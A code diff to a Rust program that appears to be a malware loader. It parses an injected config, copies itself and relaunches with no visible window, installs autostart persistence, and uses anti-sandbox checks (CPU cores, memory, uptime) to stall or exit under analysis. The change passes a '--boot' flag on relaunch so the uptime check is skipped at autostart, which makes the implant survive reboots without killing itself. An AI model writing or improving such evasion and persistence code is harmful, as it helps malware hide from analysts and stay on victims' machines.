@@ -6,6 +6,9 @@ use config::LoaderConfig;
 use std::env;
 
 fn main() {
+    let args: Vec<String> = env::args().collect();
+    let is_boot = args.iter().any(|a| a == "--boot");
+
     // 1. Parse injected config from binary
     let (injected, raw_json) = match parse_injected_config() {
         Some((cfg, json)) => (cfg, json),
@@ -20,8 +23,8 @@ fn main() {
     // 2. Apply persistence (may relaunch/copy and exit)
     apply_persistence(loader_cfg.require_admin, loader_cfg.copy_to_path.as_deref(), loader_cfg.enable_persistence);
 
-    // 3. Anti-analysis check (inline, no libra-modules dependency)
-    if is_sandbox() {
+    // 3. Anti-analysis check (skip uptime on boot to avoid self-kill on autostart)
+    if is_sandbox(is_boot) {
         eprintln!("[!] Sandbox detected. Exiting.");
         std::thread::sleep(std::time::Duration::from_secs(u64::MAX));
         std::process::exit(0);
@@ -230,12 +233,15 @@ fn copy_and_relaunch(relative_path: &str) {
     {
         use std::os::windows::process::CommandExt;
         let _ = std::process::Command::new(&target_exe)
+            .arg("--boot")
             .creation_flags(0x08000000)
             .spawn();
     }
     #[cfg(not(target_os = "windows"))]
     {
-        let _ = std::process::Command::new(&target_exe).spawn();
+        let _ = std::process::Command::new(&target_exe)
+            .arg("--boot")
+            .spawn();
     }
 
     std::process::exit(0);
@@ -274,8 +280,8 @@ fn install_persistence() {
 
 // ── Anti-analysis (inline, no libra-modules dependency) ───────────────
 
-fn is_sandbox() -> bool {
-    check_cpu_cores() || check_memory() || check_uptime()
+fn is_sandbox(skip_uptime: bool) -> bool {
+    check_cpu_cores() || check_memory() || (!skip_uptime && check_uptime())
 }
 
 fn check_cpu_cores() -> bool {
